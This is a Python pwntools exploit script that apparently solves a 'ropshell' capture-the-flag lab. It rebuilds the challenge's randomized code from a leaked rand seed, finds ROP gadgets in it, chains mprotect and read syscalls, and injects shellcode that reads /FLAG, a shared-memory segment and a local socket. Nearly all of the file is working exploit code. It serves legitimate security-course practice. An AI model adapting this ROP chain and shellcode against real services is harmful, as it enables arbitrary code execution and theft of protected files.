#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
import ctypes
import struct
import socket
import time
context.arch = 'amd64'
context.os = 'linux'

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

libc = ctypes.CDLL('libc.so.6')
LEN_CODE = (10*0x10000)

rax = asm(""" pop rax 
ret""")
rdi = asm(""" pop rdi 
ret""")
rsi = asm(""" pop rsi 
ret""")
rdx = asm(""" pop rdx
ret""")
sys = asm("""syscall
ret""")

print(rax)
print(rdi)
print(rsi)
print(rdx)
print(sys)

buf = r.recvuntil(b'is ')
timestamp = r.recvuntil(b'\n', drop=True)
buf = r.recvuntil(b'at 0x')
code_start = r.recvuntil(b'\n', drop=True) 
# buf = r.recvuntil(b'\n')

code_start = int(code_start.decode('utf-8'), 16)
# print(f'timestamp:{timestamp}')
# print(f'code_start:{code_start}')

libc.srand(int(timestamp))

global codeint
codeint = (ctypes.c_uint32 * (LEN_CODE // 4))()
for i in range(LEN_CODE // 4):
    codeint[i] = (libc.rand() << 16) | (libc.rand() & 0xffff)
codeint[libc.rand() % (LEN_CODE // 4 - 1)] = 0xc3050f

byte_array = bytearray()
for integer in codeint:
    byte_array.extend(struct.pack("I", integer))
byte_array = bytes(byte_array)


target = int('0xc3050f', 16).to_bytes(4, byteorder='little')
print(f'the target is {target}')


if byte_array.find(rax) != -1:
    rax_offset = byte_array.find(rax)

if byte_array.find(rdi) != -1:
    rdi_offset = byte_array.find(rdi)

if byte_array.find(rsi) != -1:
    rsi_offset = byte_array.find(rsi)

if byte_array.find(rdx) != -1:
    rdx_offset = byte_array.find(rdx)

if byte_array.find(sys) != -1:
    sys_offset = byte_array.find(sys)


prot = 0x7
mprot_payload = b''
mprot_payload = p64(code_start+rax_offset)
mprot_payload += p64(10)
mprot_payload += p64(code_start+rdi_offset)
mprot_payload += p64(code_start)
mprot_payload += p64(code_start+rsi_offset)
mprot_payload += p64(LEN_CODE)
mprot_payload += p64(code_start+rdx_offset)
mprot_payload += p64(prot)
mprot_payload += p64(code_start+sys_offset)
# r.send(mprot_payload)

write_payload = b''
write_payload = p64(code_start+rax_offset)
write_payload += p64(1)
write_payload += p64(code_start+rdi_offset)
write_payload += p64(code_start)
write_payload += p64(code_start+rsi_offset)
write_payload += p64(LEN_CODE)
write_payload += p64(code_start+sys_offset)


read_payload = b''
read_payload = p64(code_start+rax_offset)
read_payload += p64(0)
read_payload += p64(code_start+rdi_offset)
read_payload += p64(0)
read_payload += p64(code_start+rsi_offset)
read_payload += p64(code_start)
read_payload += p64(code_start+rdx_offset)
read_payload += p64(LEN_CODE)
read_payload += p64(code_start+sys_offset)


codes = asm(f"""
    mov rax, 2
    mov rdi, {code_start}
    mov rsi, 0
    mov rdx, 0x1b6
    syscall

    mov rdi, rax
    mov rax, 0
    mov rsi, {code_start+4096} 
    mov rdx, 128
    syscall

    mov rdx, rax
    mov rax, 1
    mov rdi, 1
    mov rsi, {code_start+4096}
    syscall
""")

codes += asm(f"""
    mov rax, 29
    mov rdi, 0x1337
    mov rsi, 128
    mov rdx, 0
    syscall

    mov rdi, rax
    mov rax, 30
    mov rsi, 0
    mov rdx, 4096
    syscall

    mov rsi, rax
    mov rax, 1
    mov rdi, 1
    mov rdx, 69
    syscall
""")

codes += asm(f"""
    mov rax, 41 
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    syscall

    mov r15, rax

    mov rdi, rax
    mov rax, 42
    mov rsi, {code_start+8}
    mov rdx, 16
    syscall

    mov rax, 0
    mov rdi, r15
    mov rsi, {code_start+8192}
    mov rdx, 128
    syscall

    mov rdx, rax
    mov rax, 1 
    mov rdi, 1
    mov rsi, {code_start+8192}
    syscall
""")

codes += asm("""
    mov rax, 60
    mov rdi, 37
    syscall
""")

# payload = b''
# payload = p64(code_start+rax_offset)
# payload += p64(60)
# payload += p64(code_start+rdi_offset)
# payload += p64(37)
# payload += p64(code_start+sys_offset)

filename = '/FLAG\0'
filename = filename.encode('ascii').ljust(8, b'\0')
host = socket.inet_aton('127.0.0.1')
uservaddr = p16(0x0002) + p16(0x3713) + host + (b'\x00' * 8)
r.sendafter(b'shell>', mprot_payload + read_payload + p64(code_start + 8 + 16))
sleep(3)
r.send(filename + uservaddr + codes)

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :